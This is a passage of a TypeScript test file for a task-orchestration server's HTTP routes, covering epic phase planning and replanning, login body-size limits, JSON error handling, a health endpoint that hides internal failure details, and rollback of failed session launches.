  const plan = await (await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'epic', phases: [{ title: 'One' }, { title: 'Two' }] }) })).json() as { epic: { id: string }; phases: { id: string }[] };
  const tail = plan.phases[1].id;
  // Insert a third phase.
  const res = await app.request(`/tasks/${plan.epic.id}/phases`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'Three', type: 'feature' }] }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { phases: { id: string; title: string; type: string; parent_id: string }[] };
  expect(body.phases.map(p => [p.title, p.type])).toEqual([['Three', 'feature']]);
  expect(body.phases[0].parent_id).toBe(plan.epic.id);
  // The new phase waits on the previous tail (phase Two).
  expect(tasks.depsFor(body.phases[0].id)).toEqual([tail]);
});

it('POST /tasks/:epicId/phases replans a residual goal into chained phases', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"R1"},{"title":"R2"}]'),
  });
  const plan = await (await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'epic', phases: [{ title: 'One' }] }) })).json() as { epic: { id: string }; phases: { id: string }[] };
  const res = await app.request(`/tasks/${plan.epic.id}/phases`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'do more' }) });
  expect(res.status).toBe(202); // residual replan is now an async plan job (relay resolves inline)
  const all = tasks.descendants(plan.epic.id);
  const r1 = all.find(t => t.title === 'R1')!; const r2 = all.find(t => t.title === 'R2')!;
  expect([r1, r2].map(p => p.title)).toEqual(['R1', 'R2']);
  expect(tasks.depsFor(r1.id)).toEqual([plan.phases[0].id]); // R1 after the existing phase
  expect(tasks.depsFor(r2.id)).toEqual([r1.id]); // R2 after R1
});

it('POST /tasks/:epicId/phases — a DAG replan does not overtake the epic\'s unfinished frontier', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    // Replan returns a DAG: R2 depends on R1 (resolved within the new batch), R1 is independent.
    makeInference: () => new FakeInference('[{"title":"R1","id":"r1","dependsOn":[]},{"title":"R2","id":"r2","dependsOn":["r1"]}]'),
  });
  const plan = await (await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'epic', phases: [{ title: 'One' }] }) })).json() as { epic: { id: string }; phases: { id: string }[] };
  const leaf = plan.phases[0].id; // the epic's current unfinished frontier
  const res = await app.request(`/tasks/${plan.epic.id}/phases`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'do more' }) });
  expect(res.status).toBe(202);
  const all = tasks.descendants(plan.epic.id);
  const r1 = all.find(t => t.title === 'R1')!; const r2 = all.find(t => t.title === 'R2')!;
  expect(tasks.depsFor(r1.id)).toEqual([leaf]);                  // independent new root still waits on the frontier
  expect(tasks.depsFor(r2.id).sort()).toEqual([r1.id, leaf].sort()); // resolved-dep phase ALSO waits on the frontier, not just R1
});

it('POST /tasks/:epicId/phases returns 404 for a non-epic id', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/tasks/nope/phases', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'X' }] }) });
  expect(res.status).toBe(404);
});

it('POST /tasks/:epicId/phases ticks an active mission so it picks up the new phase', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db);
  let ticked = '';
  const engine = { isActive: (id: string) => id === 'm-E', tick: async (id: string) => { ticked = id; } } as unknown as MissionEngine;
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  tasks.create({ id: 'E', project_id: 1, title: 'Epic', type: 'epic', description: 'goal' });
  const res = await app.request('/tasks/E/phases', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'New', details: 'Validate the login redirect' }] }) });
  expect(res.status).toBe(201);
  expect(ticked).toBe('m-E');
  // A manual phase's details flow through to the created task's description (next to the overall goal),
  // so the agent is told what to do — not just the phase title.
  const body = await res.json() as { phases: { description?: string }[] };
  expect(body.phases[0]!.description).toContain('Validate the login redirect');
  expect(body.phases[0]!.description).toContain('Overall goal: goal');
});

it('POST /auth/login caps the body before parsing it, without buffering the stream', async () => {
  // /auth/login is public, so an anonymous caller reaches a handler that reads the whole body. A
  // chunked request carries no content-length to pre-check — the cap has to stop the read itself.
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const users = new UserStore(db); users.create('admin', 'pw');
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
    clock: new FakeClock(0), config: new ConfigStore(db), users,
  });
  const { body, pulled } = streamedBody(4 * 1024 * 1024);
  const res = await app.request('/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' }, body, duplex: 'half',
  });
  expect(res.status).toBe(413);
  expect(pulled()).toBeLessThan(256 * 1024); // stopped near the cap — the 4 MB stream was never buffered
});

it('returns 400 on a malformed JSON body (central onError, not a 500)', async () => {
  const { app } = makeApp();
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{ not json' });
  expect(res.status).toBe(400);
  expect(await res.json()).toEqual({ error: 'invalid JSON body' });
});

// The whole chain an operator actually reads: a REAL pool whose fork is refused, published through the
// REAL /health route. The failure must arrive as a stable code — the raw reason quotes internal paths
// and build ids, and /health is unauthenticated by design — and the block must exist at all (removing
// `subagentPool` from /health would strand the diagnosis in a getter nobody calls).
it('GET /health surfaces the real pool: spawn failure as a stable code, never the raw reason', async () => {
  class BootRefusingChild extends EventEmitter {
    readonly pid = 0; // setPriority(0) would renice the test process itself
    connected = true;
    send(): boolean { return true; }
    kill(): boolean { return true; }
  }
  const children: BootRefusingChild[] = [];
  const pool = new SubagentRunnerPool({
    dbPath: '/tmp/elowen-health-test.db',
    project: { id: 1, slug: 't', path: '/tmp' },
    cwd: '/tmp',
    fork: () => { const c = new BootRefusingChild(); children.push(c); return c as unknown as ChildProcess; },
    machine: { cpus: () => 8, totalMemBytes: () => 32 * 1024 ** 3, availableMemBytes: () => 24 * 1024 ** 3 },
  });
  const run = pool
    .run({ channelId: 'subagent-sub-dlg-1', ownerUserId: 1, parentSessionId: 'brain-1', delegatedAccess: { admin: false, projectIds: [1], owner: true, permissionBoundary: null }, scheduled: false }, 'x')
    .catch(() => undefined); // the refusal is the point; the dispatcher would fall back in-process
  for (let i = 0; i < 4; i += 1) await new Promise((r) => { setImmediate(r); });
  children[0]?.emit('message', { type: 'fatal', reason: 'build mismatch (daemon /var/www/secret-internal-path 1.2.3)' });
  await run;

  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
    subagentPool: () => pool.stats(),
  });
  const body = await (await app.request('/health')).json() as {
    subagentPool: { mode: string; spawnFailure: { code: string; consecutive: number } | null };
  };
  expect(body.subagentPool.mode).toBe('runner');
  expect(body.subagentPool.spawnFailure?.code).toBe('build_mismatch');
  expect(body.subagentPool.spawnFailure?.consecutive).toBe(1);
  expect(JSON.stringify(body)).not.toContain('secret-internal-path');
  pool.reset('test over');
});

it('POST /sessions reverts the task to open when spawn.launch fails', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
  const tmux = new FakeTmuxDriver();
  tmux.spawn = async () => { throw new Error('tmux exploded'); };
  const spawn = new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) });
  const bus = new EventBus();
  const events: ElowenEvent[] = []; bus.subscribe((e) => events.push(e));
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus,
    engine: null as any, spawn, tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
  expect(res.status).toBe(500);
  expect(tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
  expect(events.some((e) => e.type === 'task' && e.taskId === 'elowen-s1' && e.status === 'open')).toBe(true);
});

